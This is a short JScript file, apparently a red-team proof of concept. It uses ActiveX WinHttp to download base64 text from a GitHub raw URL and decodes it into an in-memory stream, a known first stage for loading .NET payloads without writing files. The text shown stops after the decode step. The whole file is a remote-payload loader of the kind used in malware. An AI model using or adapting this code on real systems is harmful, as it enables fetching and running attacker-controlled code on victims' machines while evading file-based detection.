function base64ToStream(b) {
	var enc = new ActiveXObject("System.Text.ASCIIEncoding");
	var length = enc.GetByteCount_2(b);
	var ba = enc.GetBytes_4(b);
	var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
	ba = transform.TransformFinalBlock(ba, 0, length);
	var ms = new ActiveXObject("System.IO.MemoryStream");
	ms.Write(ba, 0, (length / 4) * 3);
	ms.Position = 0;
	return ms;
}

h=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
h.Open("GET","https://raw.githubusercontent.com/3gstudent/test/master/calcbase64.txt",false);
h.Send();

var stm = base64ToStream(h.ResponseText);
